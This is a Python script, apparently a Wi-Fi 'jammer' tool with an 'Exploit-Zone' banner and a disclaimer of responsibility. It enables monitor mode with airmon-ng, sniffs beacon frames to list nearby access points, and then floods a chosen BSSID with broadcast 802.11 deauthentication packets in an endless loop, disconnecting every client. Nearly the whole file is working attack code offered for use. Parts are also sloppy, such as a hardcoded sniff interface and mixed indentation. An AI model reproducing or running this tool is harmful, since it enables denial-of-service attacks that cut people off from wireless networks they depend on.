try:
	from scapy.all import *
	import os
	import time
	import sys
	import netifaces
	from colorama import Fore, Back, Style
except ImportError as ie:
	print(ie)
	print("[!] Exiting....")

print(Style.BRIGHT + "")

os.system("clear")

print(Fore.CYAN + "___________              .__         .__  __            __________                    ")
print(Fore.CYAN + "\_   _____/__  _________ |  |   ____ |__|/  |_          \____    /____   ____   ____  ")
print(Fore.CYAN + " |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\  ______   /     //  _ \ /    \_/ __ \ ")
print(Fore.CYAN + " |        \>    < |  |_> >  |_(  <_> )  ||  |   /_____/  /     /(  <_> )   |  \  ___/ ")
print(Fore.CYAN + "/_______  /__/\_ \|   __/|____/\____/|__||__|           /_______ \____/|___|  /\___  >")
print(Fore.CYAN + "        \/      \/|__|                                          \/          \/     \/ ")

print(Fore.BLUE + """
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 #				User It Responsibly				    #
 #				Made By Antoine Zayat				    #
 #                              Github: hacker900123				    #
 #    		I Hold No Responsibility For Any Damage Done By My Tool!	    #
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
""")



try:
	print(Fore.CYAN + ">> [*] Script Initializing....")
	time.sleep(3)
	print(Fore.GREEN + ">> [+] Script Initialized Successfully")
	time.sleep(2)
	interfaces = netifaces.interfaces()
	print(Fore.CYAN + ">> [*] Finding Interfaces.....")
	time.sleep(3)
	for interface in interfaces:
		print(Fore.YELLOW + ">> [+] Interface: " + str(interface))
	input_Interface = raw_input(Fore.CYAN + ">> [?] Enter Interface: ")
	if(input_Interface not in interfaces):
		print(Fore.RED + ">> [!] Interface Not Found!")
		time.sleep(2)
		print(Fore.RED + ">> [!] Exiting...")
		time.sleep(2)
		sys.exit()
	else:
		os.system("airmon-ng start " + str(input_Interface))
		os.system("clear")
		if(input_Interface.endswith('mon') == False):
			print(Fore.CYAN + "[!] Restarting Script For No Errors")
			time.sleep(4)
			os.system("python Jammer.py")

		if(input_Interface.endswith('mon') == True):
			time.sleep(1)
			try:
				wifi_Scan = raw_input(Fore.CYAN + ">> [?] Start Wifi Scanning(Y/n): ")
				if(wifi_Scan == "y" or wifi_Scan == "Y"):
					ap_list = []
					def PacketHandler (pkt) :
    						if pkt.haslayer (Dot11) :
        						if pkt.type == 0 and pkt.subtype == 8 :
            							if pkt.addr2 not in ap_list :
                							ap_list.append(pkt.addr2)
                							print "Available SSID: %s MAC address: %s " %(pkt.info, pkt.addr2)
									return
					sniff(iface = "wlan0mon" , prn = PacketHandler)
					bssid = raw_input(Fore.CYAN + ">> [?] Enter Target BSSID(Mac Address): ")
					time.sleep(1)
					client = "FF:FF:FF:FF:FF:FF"
					print(Fore.GREEN + ">> [+] Launching Deauth Attack...")
					time.sleep(2)
					while True:
						pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
						sendp(pkt, iface=input_Interface)
				if(wifi_Scan == "n" or wifi_Scan == "N"):
					print(Fore.CYAN + ">> [+] Stopping Monitor Mode....")
					os.system("airmon-ng stop " + str(input_Interface))
					os.system("clear")
					print(Fore.RED + ">> [!] Exiting...")
					time.sleep(2)
					sys.exit()
			except KeyboardInterrupt as ki:
				os.system("airmon-ng stop " + str(input_Interface))
				os.system("clear")
				print(Fore.CYAN + ">> [+] Stopping Monitor Mode....")
				time.sleep(3)
				print(Fore.RED + ">> [!] Exiting...")
				time.sleep(2)
				sys.exit()
except KeyboardInterrupt as e:
	os.system("airmon-ng " + str(input_Interface))
	os.system("clear")
	print(Fore.CYAN + ">> [+] Stopping Monitor Mode....")
	time.sleep(3)
	print(Fore.RED + "[!] Exiting....")
	time.sleep(2)
	sys.exit()
